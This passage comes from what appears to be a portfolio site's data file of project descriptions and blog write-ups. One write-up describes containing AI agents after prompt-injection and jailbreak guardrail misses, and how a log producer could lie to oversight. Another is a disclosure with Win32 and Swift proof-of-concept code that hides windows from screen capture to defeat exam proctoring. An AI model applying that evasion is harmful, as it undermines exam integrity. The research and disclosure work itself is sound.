        "Source-bound attribution with rights verification (MIT for code; poetry and translations retain their own licenses, e.g. CC BY-SA)",
        "Delivered as a static container behind an outbound tunnel — no inbound surface",
      ],
    },
    fullDescription:
      "Divan is a bilingual Persian-poetry experience built for a Persian Society Open Day stall. A visitor selects Hafez or Rumi, holds an intention, and receives a single reviewed verse with its English translation, source attribution, and optional recitation. It is offline-first and privacy-first by construction, no cookies, trackers, backend, or visitor input, so it runs reliably on a venue's unreliable network while collecting nothing about the people who use it.",
    problem:
      "A public Open Day stall needs a fast, delightful cultural experience that works on unreliable venue Wi-Fi, respects visitor privacy completely, and treats Persian poetry with cultural and scholarly integrity, no hallucinated verses, no rasterized calligraphy, no data collection.",
    solution: [
      "Curated exactly 60 Hafez + 60 Rumi verses (120 total), each bound to an immutable edition with documented, verifiable source provenance",
      "Made the whole app offline-first with a hand-written service worker so the stall keeps working with no network",
      "Selected verses fairly with a Web Crypto shuffle bag entirely on-device — no server, no record of what anyone drew",
      "Rendered live Nastaliq typography and per-poet art direction for cultural authenticity instead of flattened images",
      "Built accessibility in from the start: bilingual/RTL markup, bidirectional isolation, live regions, forced-colors and reduced-motion support",
    ],
    proof: [
      "Zero data collection: no cookies, trackers, or backend — only public poem IDs in sessionStorage",
      "Runs fully offline after first load via the integrity-verified service worker",
      "A production compiler rejects synthetic test data before deployment, so only the reviewed corpus ever ships",
      "Tested across unit, component, accessibility, offline, share, performance, and security suites (Vitest) plus Playwright Chromium e2e",
    ],
  },
  "nexus-archive": {
    slug: "nexus-archive",
    title: "Nexus Archive",
    category: "ENGINEERING",
    year: "2026",
    description:
      "Cyberpunk-styled personal media vault with React frontend, Litestar API, and Supabase auth. AI-assisted recommendations, encrypted takeaways, and hardened cookie-based auth.",
    localizedDescription: {
      fa: "مخزن رسانه‌ای شخصی با سبک سایبرپانک با فرانت‌اند React، ای‌پی‌آی Litestar و احراز هویت Supabase. توصیه‌های مجهز به هوش مصنوعی و احراز هویت سخت‌گیرانه مبتنی بر کوکی.",
      ar: "خزنة وسائط شخصية بأسلوب السايبربانك مع واجهة أمامية React وواجهة برمجة تطبيقات Litestar ومصادقة Supabase. توصيات مدعومة بالذكاء الاصطناعي ومصادقة قوية تعتمد على ملفات تعريف الارتباط.",
      zh: "赛博朋克风个人媒体库，使用 React 前端、Litestar API 和 Supabase 身份验证。人工智能辅助推荐、加密记录和增强的基于 cookie 的身份验证。",
      es: "Bóveda de medios personales de estilo cyberpunk con frontend de React, API de Litestar y autenticación de Supabase. Recomendaciones asistidas por IA y autenticación reforzada basada en cookies.",
    },
    tags: ["React", "Python", "Litestar", "Supabase", "AI", "Full-Stack"],
    links: {
      demo: "https://home-notes-app.uk/",
      repo: "https://github.com/Raoof128/Nexus_Archive",
      caseStudy: "/projects/nexus-archive",
    },
    build: {
      stack: [
        "React 19",
        "Vite",
        "Tailwind CSS 4",
        "TanStack Query",
        "Python 3.12",
        "Litestar",
        "Supabase PostgreSQL",
        "Docker",
        "Terraform",
      ],
      features: [
        "AI-assisted media recommendations via Gemini with graceful degradation",
        "Real-time chat transcripts with user-scoped sanitization",
        "Status tracking, ratings, and reviews for anime, movies, and books",
        "Smart filtering and search across entire media library",
      ],
    },
    secure: {
      measures: [
        "HttpOnly SameSite=Strict auth cookies (no frontend-readable tokens)",
        "Short-lived access tokens with silent rotation via /auth/refresh",
        "AI prompt isolation with XML delimiters, string scrubbing, and PII masking",
        "Encrypted takeaway persistence (AES via TAKEAWAY_ENCRYPTION_KEY)",
        "Bandit, pip-audit, npm audit, and secret scanning in CI",
      ],
    },
    fullDescription:
      "Nexus Archive is a cyberpunk-styled personal media vault combining a React frontend, a Litestar API, and Supabase-backed identity and persistence. Manage books, movies, anime, ratings, takeaways, chat sessions, and AI-assisted recommendations from a single dashboard.",
    problem:
      "Existing media trackers are fragmented across platforms with weak security postures. Users need a unified catalog that treats their entertainment library as a curated identity system, not just a checklist, with real security built in.",
    solution: [
      "Built a full-stack vault with React 19 + Litestar API backed by Supabase PostgreSQL with Row Level Security",
      "Implemented backend-managed HttpOnly auth cookies replacing frontend-readable Supabase tokens",
      "Integrated Gemini AI for media recommendations with shared per-user rate limiting and local fallback",
      "Added encrypted takeaway persistence and AI prompt isolation with PII masking",
    ],
    proof: [
      "Hardened auth: HttpOnly + SameSite=Strict cookies with silent token rotation",
      "CI security gates: Bandit, pip-audit, npm audit, secret scanning",
      "Locust load testing for performance verification",
      "Terraform IaC scaffold for reproducible Supabase + Vercel deployments",
    ],
  },
  nanomatch: {
    slug: "nanomatch",
    title: "NanoMatch",
    category: "ENGINEERING",
    year: "2026",
    description:
      "High-performance limit order book and matching engine in C++20. Processing 1M+ orders/second with sub-microsecond latency.",
    localizedDescription: {
      fa: "دفتر سفارش محدود و موتور تطبیق با کارایی بالا در C++20. پردازش بیش از ۱ میلیون سفارش در ثانیه با تأخیر زیر میکروثانیه.",
      ar: "دفتر أوامر محدد ومحرك مطابقة عالي الأداء بلغة C++20. معالجة أكثر من مليون أمر في الثانية مع زمن انتقال أقل من ميكروثانية.",
      zh: "使用 C++20 编写的高性能限价订单簿和匹配引擎。每秒处理超过 100 万个订单，延迟在亚微秒级。",
      es: "Libro de órdenes limitadas y motor de emparejamiento de alto rendimiento en C++20. Procesa más de 1 millón de órdenes por segundo con latencia de submilisegundos.",
    },
    tags: ["C++20", "CMake", "Google Test", "HFT", "Systems Programming"],
    links: {
      repo: "https://github.com/Raoof128/NanoMatch",
      caseStudy: "/projects/nanomatch",
    },
    build: {
      stack: [
        "C++20",
        "CMake 3.20+",
        "Google Test 1.17",
        "GitHub Actions CI/CD",
        "AddressSanitizer",
        "UBSan",
      ],
      features: [
        "Price-time priority (FIFO) matching algorithm",
        "4 order types: Limit, Market, IOC, Fill-or-Kill",
        "O(1) order cancellation/modification via hash map",
        "Custom pool allocator eliminating heap allocation overhead",
      ],
    },
    secure: {
      measures: [
        "AddressSanitizer and UndefinedBehaviorSanitizer in CI",
        "60+ unit tests across 18 test suites",
        "cppcheck static analysis on every push",
        "No external runtime dependencies",
      ],
    },
    fullDescription:
      "NanoMatch is a high-performance limit order book and matching engine built in modern C++20. It simulates a financial exchange's core operations, processing buy/sell orders with price-time priority matching at millions of operations per second.",
    problem:
      "Financial exchanges require ultra-low-latency order matching. Understanding how matching engines work at the systems level demands building one from scratch with real performance constraints.",
    solution: [
      "Implemented price-time priority (FIFO) matching with support for Limit, Market, IOC, and FOK orders",
      "Designed O(1) order cancellation and modification using hash map indexing",
      "Built a custom pool allocator to eliminate heap allocation overhead on the hot path",
      "Added multi-instrument support with independent order books per symbol",
    ],
    proof: [
      "Throughput: 1M+ orders/second with sub-microsecond latency",
      "Comprehensive test suite with p50/p99 latency benchmarks",
      "60+ unit tests across 18 test suites — all passing",
      "CI: ASan, UBSan, cppcheck, clang-format on every push",
    ],
  },
  sentinelflow: {
    slug: "sentinelflow",
    title: "SentinelFlow",
    category: "DEFENSIVE",
    year: "2026",
    description:
      "Real-time network intrusion detection system in C++17. Layered protocol dissection, Snort-inspired rule engine, and stateful threat detection parsing 500K+ packets/second.",
    localizedDescription: {
      fa: "سیستم تشخیص نفوذ شبکه بلادرنگ در C++17. تشریح پروتکل لایه‌ای، موتور قوانین الهام گرفته از Snort و تشخیص تهدید حالت‌دار با پردازش بیش از ۵۰۰ هزار بسته در ثانیه.",
      ar: "نظام كشف التسلل للشبكة في الوقت الفعلي بلغة C++17. تشريح البروتوكولات الطبقية، محرك قواعد مستوحى من Snort، وكشف التهديدات مع تحليل أكثر من ٥٠٠ ألف حزمة في الثانية.",
      zh: "使用 C++17 编写的实时网络入侵检测系统。分层协议解析、受 Snort 启发的规则引擎以及状态威胁检测，每秒解析超过 50 万个数据包。",
      es: "Sistema de detección de intrusiones en red en tiempo real en C++17. Disección de protocolos por capas, motor de reglas inspirado en Snort y detección de amenazas con estado que analiza más de 500k paquetes por segundo.",
    },
    tags: [
      "C++17",
      "libpcap",
      "IDS",
      "Network Security",
      "Systems Programming",
    ],
    links: {
      repo: "https://github.com/Raoof128/SentinelFlow",
      caseStudy: "/projects/sentinelflow",
    },
    build: {
      stack: [
        "C++17",
        "libpcap",
        "CMake",
        "Google Test",
        "Snort-inspired Rules",
        "BPF Filters",
      ],
      features: [
        "Live network capture via libpcap with configurable BPF filters",
        "Layered protocol dissection: Ethernet, IPv4, TCP, UDP, ICMP, DNS, ARP",
        "Snort-inspired configurable rule engine with signature matching",
        "Stateful threat detection (port scans, SYN floods, DNS tunneling)",
      ],
    },
    secure: {
      measures: [
        "Color-coded severity-level alerting (LOW → CRITICAL)",
        "27 unit/integration tests covering all protocol layers",
        "CSV export for forensic analysis and SIEM integration",
        "Configurable BPF filters for targeted capture",
      ],
    },
    fullDescription:
      "SentinelFlow is a real-time network intrusion detection system that captures live network traffic or processes pcap files, dissects protocol headers across multiple OSI layers, identifies known attack signatures and anomalies, and exports security alerts to console and CSV formats.",
    problem:
      "Network intrusion detection requires deep packet inspection at wire speed. Commercial IDS solutions are opaque; building one from scratch reveals how protocol dissection, signature matching, and stateful analysis actually work.",
    solution: [
      "Implemented layered protocol dissection covering Ethernet, IPv4, TCP, UDP, ICMP, DNS, and ARP",
      "Built a Snort-inspired configurable rule engine for flexible signature matching",
      "Added stateful threat detection for port scans, SYN floods, and DNS tunneling",
      "Engineered for throughput: 500K+ packets/sec parsing performance",
    ],
    proof: [
      "Throughput: 500K+ packets/sec parsing performance",
      "Protocol coverage: 7 protocols across Layers 2-7",
      "27 unit/integration tests — all passing",
      "Supports both live capture and pcap file analysis",
    ],
  },
  ecrsm: {
    slug: "ecrsm",
    title: "eBPF Cloud Runtime Security Monitor",
    category: "OFFENSIVE",
    year: "2025",
    description:
      "Synthetic, read-only runtime visibility stack combining kernel eBPF, Go agent, and React dashboard. Educational runtime monitor.",
    localizedDescription: {
      fa: "پشته مشاهده‌پذیری زمان اجرا فقط خواندنی که ترکیبی از eBPF هسته، عامل Go و داشبورد React است. مانیتور زمان اجرای آموزشی.",
      ar: "مجموعة أدوات الرؤية وقت التشغيل للقراءة فقط، تجمع بين eBPF للنواة ووكيل بلغة Go ولوحة تحكم React. مراقب وقت تشغيل تعليمي.",
      zh: "合成的只读运行时可视化堆栈，结合了内核 eBPF、Go 代理和 React 仪表板。教学用运行时监控器。",
      es: "Stack de visibilidad en tiempo de ejecución sintético y de solo lectura que combina eBPF del kernel, agente Go y panel de React. Monitor de tiempo de ejecución educativo.",
    },
    tags: ["eBPF", "Go", "React", "Kernel", "Runtime Security"],
    links: {
      repo: "https://github.com/Raoof128/eBPF-Cloud-Runtime-Security-Monitor",
      caseStudy: "/projects/ecrsm",
    },
    build: {
      stack: [
        "eBPF (C)",
        "Go (Agent)",
        "React (Dashboard)",
        "Kubernetes (Helm)",
      ],
      features: [
        "Kernel tracepoints (execve, connect, ptrace, mmap)",
        "Go agent for enrichment & rules",
        "Live WebSocket dashboard",
        "Kubernetes DaemonSet deployment",
      ],
    },
    secure: {
      measures: [
        "Read-only introspection (no kernel writes)",
        "Metadata only (no payloads/secrets)",
        "Least privilege (BPF/SYS_ADMIN caps only)",
        "Safe synthetic simulations",
      ],
    },
    fullDescription:
      "ECRSM is an educational eBPF-based Cloud Runtime Security Monitor. It provides a synthetic, read-only runtime visibility stack combining kernel eBPF, a Go agent, and a React dashboard.",
    problem:
      "Understanding runtime security at the kernel level is complex. ECRSM provides a safe, educational platform to learn eBPF-based monitoring.",
    solution: [
      "Implemented eBPF hooks for safe syscall tracepoints",
      "Built a Go agent to collect and enrich metadata",
      "Created a real-time React dashboard for visualization",
      "Designed safe synthetic attack simulations",
    ],
    proof: [
      "Detects reverse shells, process injection, suspicious execs",
      "Low-overhead perf buffer data transmission",
      "Container/K8s metadata enrichment",
      "Verifiable via synthetic attack scripts",
    ],
  },
  simurghforge: {
    slug: "simurghforge",
    title: "SimurghForge",
    category: "ENGINEERING",
    year: "2026",
    description:
      "Universal file converter for macOS. 49 formats across images, documents, audio, video, and data — powered by 9 conversion engines. Zero cloud, single .app bundle.",
    localizedDescription: {
      fa: "مبدل فایل جهانی برای macOS. ۴۹ فرمت در تصاویر، اسناد، صدا، ویدئو و داده — مجهز به ۹ موتور تبدیل. بدون ابر، تک فایل .app.",
      ar: "محول ملفات عالمي لنظام macOS. ٤٩ تنسيقاً تشمل الصور والمستندات والصوت والفيديو والبيانات — مدعوم بـ ٩ محركات تحويل. بدون سحابة، حزمة .app واحدة.",
      zh: "适用于 macOS 的通用文件转换器。支持 49 种格式，涵盖图像、文档、音频、视频和数据——由 9 个转换引擎驱动。零云端，单文件 .app 包。",
      es: "Convertidor de archivos universal para macOS. 49 formatos en imágenes, documentos, audio, video y datos, potenciado por 9 motores de conversión. Sin nube, un solo paquete .app.",
    },
    tags: ["Tauri v2", "Rust", "React", "TypeScript", "FFmpeg", "macOS"],
    links: {
      repo: "https://github.com/Raoof128/SimurghForge",
      caseStudy: "/projects/simurghforge",
    },
    build: {
      stack: [
        "Tauri v2 (Rust 1.77+)",
        "React 18",
        "TypeScript",
        "Vite",
        "Tailwind CSS v4",
        "FFmpeg",
        "LibreOffice",
        "Pandoc",
        "Python Pandas",
        "ImageMagick",
      ],
      features: [
        "9 conversion engines: 4 native Rust + 5 CLI-bridged (FFmpeg, LibreOffice, Pandoc, Pandas, ImageMagick)",
        "49 supported formats across images, documents, audio, video, and structured data",
        "Batch conversion up to 50 files with configurable concurrency (Tokio semaphore)",
        "MIME-type detection via magic bytes for automatic engine routing",
      ],
    },
    secure: {
      measures: [
        "100% local processing — zero network calls, no cloud dependency",
        "MIME-based magic byte detection prevents extension spoofing",
        "Path sanitisation for all file operations",
        "Single .app bundle — no background services or daemons",
      ],
    },
    fullDescription:
      "SimurghForge is a universal file converter for macOS built with Tauri v2 (Rust backend + React/TypeScript frontend). It converts files across 49 formats spanning images, documents, audio, video, and structured data using 9 specialised conversion engines, 4 native Rust engines for maximum performance and 5 CLI-bridged engines for format breadth. All processing happens locally with zero cloud dependency.",
    problem:
      "File conversion typically requires uploading sensitive documents to cloud services, using multiple specialised tools, or installing bloated Electron apps. Users need a single, fast, privacy-respecting tool that handles all common formats locally.",
    solution: [
      "Built a three-tier engine architecture: native Rust (fastest), CLI tools (feature-rich), and Python (tabular data)",
      "Implemented MIME-type detection via magic bytes for automatic engine selection",
      "Designed batch orchestration with Tokio semaphore-based concurrency control",
      "Shipped as a single .app bundle with quality presets (Low/Medium/High/Lossless)",
    ],
    proof: [
      "49 formats supported across 5 categories (images, documents, audio, video, data)",
      "9 conversion engines with automatic routing based on MIME detection",
      "Batch processing up to 50 files with configurable threading (1-8 threads)",
      "Zero network calls — fully offline local processing",
    ],
  },
  aion: {
    slug: "aion",
    title: "Aion",
    category: "ENGINEERING",
    year: "2026",
    description:
      "AI-powered Bible companion using Hybrid RAG. Keyword + semantic vector search (pgvector), real-time SSE streaming via Gemini, and cross-platform support with Tauri v2.",
    localizedDescription: {
      fa: "همراه کتاب مقدس مجهز به هوش مصنوعی با استفاده از Hybrid RAG. جستجوی کلمات کلیدی + بردار معنایی (pgvector)، پخش بلادرنگ SSE از طریق Gemini.",
      ar: "رفيق الكتاب المقدس المدعوم بالذكاء الاصطناعي باستخدام Hybrid RAG. بحث بالكلمات الرئيسية + البحث المتجه الدلالي (pgvector)، وبث SSE في الوقت الفعلي عبر Gemini.",
      zh: "人工智能驱动的圣经伙伴，使用混合 RAG。关键词 + 语义向量搜索 (pgvector)，通过 Gemini 实现实时 SSE 流式传输。",
      es: "Compañero bíblico potenciado por IA que utiliza Hybrid RAG. Búsqueda por palabras clave + vectores semánticos (pgvector), transmisión SSE en tiempo real a través de Gemini.",
    },
    tags: [
      "React Native",
      "Expo",
      "Supabase",
      "pgvector",
      "Gemini AI",
      "Tauri v2",
    ],
    links: {
      repo: "https://github.com/Raoof128/Aion",
      caseStudy: "/projects/aion",
    },
    papers: [
      {
        title:
          "Aion-BibleQA: Evaluating Retrieval and Citation Faithfulness in Verse-Grounded Bible RAG Systems",
        label: "Preprint",
        href: "/aion-bibleqa-citation-faithfulness-bible-rag.pdf",
        kind: "download",
        venue: "Zenodo",
        year: "2026",
        status: "Pilot benchmark preprint",
        description:
          "8-page paper introducing a 40-question Bible RAG benchmark for citation faithfulness and false-premise robustness, with v3 retrieval reaching R@5 = 0.941, mean citation_support = 0.978, zero unsupported citations, and 6/6 false-premise refusals.",
        doi: "10.5281/zenodo.20522874",
      },
    ],
    build: {
      stack: [
        "React Native 0.81",
        "Expo 54",
        "TypeScript",
        "Supabase PostgreSQL",
        "pgvector",
        "OpenAI Embeddings",
        "Gemini 3.1 Flash",
        "Tauri v2",
        "TanStack Query v5",
        "NativeWind",
      ],
      features: [
        "Hybrid RAG pipeline: regex keyword extraction + OpenAI embedding (1536-dim) + pgvector semantic search",
        "Real-time SSE streaming from Gemini via Supabase Edge Functions",
        "Rich inline verse cards with book/chapter/verse attribution",
        "Cross-platform: React Native (iOS/Android) + Tauri v2 (macOS/Windows/Linux)",
      ],
    },
    secure: {
      measures: [
        "All API keys (OpenAI, Gemini, service_role) stored server-side only in Edge Function secrets",
        "IP-based rate limiting: 5/min burst, 30/3hrs per IP, 200/day global cap",
        "Row-Level Security (RLS) on all Supabase tables",
        "500-character message length cap to prevent token-stuffing",
        "Exact-match response cache (zero LLM cost on repeated queries)",
        "Fail-closed: rate limit errors default to deny",
      ],
    },
    fullDescription:
      "Aion is an AI-powered Bible companion that lets users ask questions about scripture in plain language. Responses are grounded in actual Bible data retrieved via a Hybrid RAG pipeline combining keyword matching and semantic vector search (pgvector), then streamed in real time via SSE from Gemini. The app runs on mobile (React Native + Expo) and desktop (Tauri v2).",
    problem:
      "Bible study tools are either keyword-only search engines that miss semantic meaning, or AI chatbots that hallucinate verses. Users need conversational AI that is genuinely grounded in scripture with verifiable citations.",
    solution: [
      "Built a Hybrid RAG pipeline combining regex-based keyword extraction with OpenAI embedding (1536-dim) + pgvector semantic search",
      "Implemented real-time SSE streaming from Gemini via Supabase Edge Functions",
      "Designed rich inline verse cards with full book/chapter/verse attribution for verifiability",
      "Added cross-platform support: React Native for mobile + Tauri v2 for native desktop",
    ],
    proof: [
      "Hybrid RAG retrieval ensures answers are grounded in actual scripture, not hallucinated",
      "IP-based rate limiting (5/min burst, 30/3hrs, 200/day) with fail-closed defaults",
      "Exact-match response cache eliminates redundant LLM costs",
      "Anonymous auth with zero sign-up friction — Supabase RLS enforced on all tables",
    ],
  },
};

export interface Writeup {
  slug: string;
  title: string;
  date: string;
  tag: string;
  takeaway: string;
  content: string; // Markdown content
}

export const writeups: Writeup[] = [
  {
    slug: "project-simurgh-containment",
    title: "Attesting What an AI Agent Was Allowed to Do",
    date: "2026-06-28",
    tag: "AI Security",
    takeaway:
      "Signed, offline-verifiable evidence of an agent's actions after a guardrail miss: 138/138 classifier-missed cases contained, 9/140 to 0/140 on AgentDojo.",
    content: `
## The gap inline classifiers leave

An input classifier reads a prompt and decides whether the model may answer. It never sees what the agent does next, which tool it calls, what it reads from a returned web page, what it writes back out. When a jailbreak or an injected instruction slips past the classifier, nothing downstream is obligated to prove the agent stayed inside its authority.

**Project Simurgh** fills that gap. It is not a better classifier; it is a provider-agnostic framework that produces Ed25519-signed, offline-reproducible evidence of what an agent was *allowed* to do after a guardrail miss. The classifier governs what a model may say; the attestation governs what an agent was allowed to do.

### Four containment boundaries

Every agent action crosses one of four gates, and each gate emits a signed record:

| Boundary | Guards against |
|----------|----------------|
| **Input firewall** | Direct prompt injection at the entry point |
| **Context-provenance guard** | Instructions smuggled in through retrieved or tool-returned content |
| **Tool-invocation gate** | Unauthorised or out-of-policy tool calls |
| **Output-leakage firewall** | Secrets exfiltrated in the final response |

### A dishonest-producer threat model

Most evidence systems assume the thing writing the logs is honest. Simurgh assumes the opposite: the producer may lie, drop, reorder, or forge records. The answer is decision-replay and emission-completeness checks, a verifier re-derives each decision from the signed inputs and catches a falsified or missing record. The trust root is not "trust the log," it is "re-check the log."

### What the numbers measure

- **Guardrail-miss containment.** Against a real Llama Guard 4 (12B) classifier over a 180-case run-set, Simurgh contained **138/138** malicious cases the classifier missed, 120 of them downstream-injection cases an input-only classifier structurally cannot see, plus 18 direct-input misses. Combined targeted attack-success: **0/150**, with zero unsafe tool executions or exports.
- **Live-agent containment.** Driving a self-hosted Llama-3.3-70B through AgentDojo's workspace suite (140 pre-registered injection cases), the tool-authority gate cut targeted attack success from **9/140 to 0/140** with benign utility held.

### Attacking its own proof

A containment system that tests only the agent, never itself, is theatre. Simurgh red-teams its attestation core across eight attack classes: tamper, key-swap, canonical-laundering, digest-collision, cross-stage replay, self-proof mutation, and policy drift. The trust root held on all eight; two detector weaknesses surfaced, were versioned into a detector-v2, and re-tested. A producer-independent witness recorded zero false accusations and zero missed lies.

### Machine-checked oversight

Approval-gate friction receipts prove an oversight checkpoint preceded every protected authority crossing, through a two-key pincer that defeats self-approval and backdating. The core invariants, fail-closed, friction precedence, no-silent-exemption, are closed with **five machine-checked Lean theorems**, so they are proofs, not test cases.

### Honest non-claims

The preprints sign their limits. Simurgh would **not** have caught the June 2026 content-generation bypass by itself, that is a model-output problem, not an agent-authority one. It is defence in depth, not a replacement for inline safeguards. Reproduction is one command over a 12-rung signed release ladder; 989 automated tests across 44 releases; AGPL-3.0.
    `,
  },
  {
    slug: "invisible-window-research",
    title:
      "How I Made Windows Invisible to Screen Capture, and Why Exam Proctoring Is Broken",
    date: "2026-03-20",
    tag: "Security Research",
    takeaway:
      "Documented OS APIs on Windows and macOS allow any app to hide its window from all screen capture, defeating WebRTC-based exam proctoring with 100% evasion and zero artifacts.",
    content: `
## The Vulnerability in One Sentence

Every major operating system ships a documented API that lets any application make its window invisible to screen capture while remaining perfectly visible on the physical display. Exam proctoring software that relies on screen capture to enforce integrity is structurally defeatable with a single API call.

---

## Background: How Proctoring Works

WebRTC-based remote proctoring systems, the kind deployed by universities worldwide since 2020, work by capturing the student's screen during an exam session. The browser extension or native client requests a \`getDisplayMedia()\` stream, transmits it to the proctor's server, and flags anomalies: opened windows, visible applications, clipboard activity. The implicit security model is:

> **If I capture your screen, I can see everything on it.**

This assumption is wrong on Windows and macOS.

---

## The Windows Side: \`SetWindowDisplayAffinity\`

Microsoft documented this API in the Win32 SDK as a Digital Rights Management mechanism, its intended use case is preventing screen capture of premium video content (think Netflix's desktop app). The function signature is simple:

\`\`\`c
BOOL SetWindowDisplayAffinity(HWND hWnd, DWORD dwAffinity);
\`\`\`

Passing \`WDA_EXCLUDEFROMCAPTURE\` as the affinity flag tells Windows to exclude the target window from **all** screen capture paths:

- \`BitBlt\` / \`PrintWindow\` (legacy GDI)
- \`IDXGIOutputDuplication\` (Desktop Duplication API)
- \`Windows.Graphics.Capture\` (modern WinRT)
- WebRTC's \`getDisplayMedia()\` capture pipeline

The window continues to render on the physical display normally. The user sees it. The proctoring stream does not.

**No administrator privileges are required.** The API operates on windows owned by the calling process, which is entirely within normal user-space operation. No kernel modifications, no driver signing bypass, no privilege escalation.

### PoC (Win32 C)

\`\`\`c
#include <windows.h>

int main() {
    HWND hwnd = CreateWindowEx(/* ... window params ... */);

    // Single API call, window now invisible to all screen capture
    SetWindowDisplayAffinity(hwnd, WDA_EXCLUDEFROMCAPTURE);

    ShowWindow(hwnd, SW_SHOW);
    // Window is visible on physical display
    // Window is absent from all capture streams

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;
}
\`\`\`

---

## The macOS Side: \`NSWindow.SharingType.none\`

Apple's equivalent is found in AppKit. Every \`NSWindow\` instance has a \`sharingType\` property, documented in the AppKit reference since macOS 10.6 (2009):

\`\`\`swift
import AppKit

let window = NSWindow(
    contentRect: NSRect(x: 100, y: 100, width: 800, height: 600),
    styleMask: [.titled, .closable, .resizable],
    backing: .buffered,
    defer: false
)

// Single property assignment, window excluded from all capture
window.sharingType = .none

window.makeKeyAndOrderFront(nil)
\`\`\`

Setting \`sharingType\` to \`.none\` excludes the window from:

- \`CGWindowListCreateImage\` (legacy Core Graphics capture)
- \`ScreenCaptureKit\` (\`SCStreamConfiguration\`, Apple's modern capture framework)
- \`AVCaptureScreenInput\` (AV Foundation screen recording)
- WebRTC's \`getDisplayMedia()\` on macOS

**macOS 26.3.1 remains vulnerable.** Apple introduced changes to ScreenCaptureKit in macOS 15 that were widely expected to close this gap, but testing confirmed the \`.none\` affinity still produces full capture evasion on macOS 26.3.1.

---

## Test Results

| Platform | Proctoring Capture Visible? | Artifacts in Session Log? |
|----------|-----------------------------|---------------------------|
| Windows 10 | No | None |
| Windows 11 | No | None |
| macOS 14 | No | None |
| macOS 26.3.1 | No | None |
| Linux (X11) | Yes | N/A, not vulnerable |
| Linux (Wayland) | Yes | N/A, not vulnerable |

Linux is not vulnerable because neither X11 nor Wayland exposes a per-window capture exclusion API. The absence of this feature is, in this context, a security advantage.

---

## Why This Is Structurally Hard to Fix

The vulnerability is a design conflict between two legitimate OS features:

1. **DRM / Content Protection**: Media companies need to prevent unauthorized recording of premium content. \`WDA_EXCLUDEFROMCAPTURE\` and \`NSWindow.SharingType.none\` exist to serve this requirement.

2. **Exam Integrity**: Proctoring systems assume that capturing the screen gives a complete view of the user's desktop.

These two requirements are fundamentally incompatible. Any OS that supports (1), which Windows and macOS do by design, cannot simultaneously guarantee (2) at the screen-capture layer.

**The only mitigation paths available to proctoring vendors require moving below the OS API layer:**

- Require a native kernel extension / driver component that intercepts at the display driver level rather than the application API level
- Move to hardware-attested environment proofs (TPM, Secure Enclave) rather than screen content analysis
- Accept that screen-capture-based integrity is not achievable on general-purpose consumer OS platforms

---

## Responsible Disclosure Timeline

| Date | Action |
|------|--------|
| January 2026 | Proctoring vendors notified with full technical writeup and PoC |
| February 2026 | Microsoft and Apple notified |
| March 2026 | Public disclosure after 90-day window; Zenodo preprint published (CC BY 4.0) |

The vendors' responses confirmed awareness of the OS-level mechanism. The core challenge, that the vulnerability is in a documented OS feature, not a bug in vendor code, limits what any individual vendor can patch without OS-level cooperation.

---

## Takeaway

Screen-capture-based exam proctoring on Windows and macOS provides a weaker integrity guarantee than its deployment context requires. The attack surface is a single API call, requires no elevated privileges, leaves no log artifacts, and works across all tested platform versions including the latest macOS release. It is a systemic design incompatibility between content-protection APIs and the integrity assumptions baked into remote-proctoring architecture.

The full 13-page paper, PoC implementations, and disclosure materials are available in the repository.
    `,
  },
  {
    slug: "nanomatch-deep-dive",
    title: "Building a Sub-Microsecond Matching Engine in C++20",
    date: "2026-03-10",
    tag: "C++",
    takeaway:
      "How a three-layer data structure design achieves O(1) cancellation and sub-microsecond latency.",
    content: `
## The system every exchange runs on

Every electronic exchange (NYSE, NASDAQ, CME) runs a matching engine at its center. It pairs buy orders with sell orders at the best available price. Building one at the systems level means learning price-time priority, memory allocation on the hot path, and sub-microsecond latency engineering.

**NanoMatch** is my from-scratch implementation in modern C++20, processing 1M+ orders per second with sub-microsecond latency.

### The Three-Layer Data Structure

A naive implementation might use a single priority queue. The problem: O(1) best price but O(n) cancellation. On real exchanges, **90%+ of all order activity is cancellations**, so optimising cancel latency matters more than insert.

NanoMatch uses three cooperating structures:

| Layer | Structure | Purpose |
|-------|-----------|---------|
| **Price levels** | \`std::map<Price, PriceLevel>\` | Sorted by price. \`std::greater\` for bids (highest first), \`std::less\` for asks (lowest first). O(log M) insert, O(1) best via \`begin()\`. |
| **Order queue** | \`std::list<Order>\` per level | FIFO queue at each price. O(1) append, O(1) erase by iterator. |
| **Lookup** | \`std::unordered_map<OrderID, Iterator>\` | O(1) cancel, hash lookup yields a list iterator, erase is constant time. |

This is the same asymptotic profile used by production exchange engines.

### Integer Prices, Avoiding Floating-Point Traps

Prices are stored as \`int32_t\` in cents (\`$101.50 = 10150\`). Floating-point comparison (\`==\`) is unreliable due to representation error. In a matching engine, this could cause price levels that should merge remaining as separate entries, or orders matching at the wrong price. Integer arithmetic makes comparison exact and deterministic.

### The Pool Allocator

Every \`malloc\` / \`free\` on the hot path risks kernel-mode syscalls, lock contention in the allocator, and cache pollution. NanoMatch uses a custom free-list pool allocator:

- Pre-allocates a contiguous \`std::vector<T>\` of fixed capacity
- \`allocate()\` = pop head of free list = O(1), zero syscalls
- \`deallocate()\` = push to head = O(1), zero syscalls
- All memory lives in a single cache-friendly contiguous block

The benchmark shows the pool allocator eliminates the allocation jitter that causes tail latency spikes.

### Order Types Done Right

Four order types with production-grade semantics:

- **Limit**: Match what crosses, rest the remainder on the book
- **Market**: Price set to \`MAX/MIN\` to guarantee crossing, never rests
- **IOC** (Immediate-or-Cancel): Like limit but cancel unfilled remainder
- **FOK** (Fill-or-Kill): Atomic pre-check via \`can_fill_completely()\`, scans all crossable levels before executing. If insufficient liquidity exists, zero fills occur

Modify is implemented as cancel + re-add, which is **correct exchange behavior**, modifications lose time priority, just like on NYSE and NASDAQ.

### Latency Profile

| Percentile | Latency |
|------------|---------|
| p50 | 84 ns |
| p99 | 625 ns |
| p99.9 | 1,250 ns |

The 15x ratio between p50 and p99.9 is realistic. Spikes come from red-black tree rebalancing on new price level insertion, orders sweeping multiple levels, and cache misses on cold levels. In production, **tail latency is the metric that differentiates systems**.
    `,
  },
  {
    slug: "sentinelflow-deep-dive",
    title: "Anatomy of a Network Intrusion Detection System",
    date: "2026-03-15",
    tag: "Network Security",
    takeaway:
      "Layered protocol dissection, Snort-inspired rules, and stateful threat detection at 500K+ packets/sec.",
    content: `
## The IDS Pipeline

Commercial intrusion detection systems like Snort and Suricata follow a common architecture: **Capture → Parse → Detect → Alert**. SentinelFlow implements this full pipeline in C++17 with libpcap, parsing 500K+ packets/sec on a single thread.

### Capture: BPF Filters Run in Kernel Space

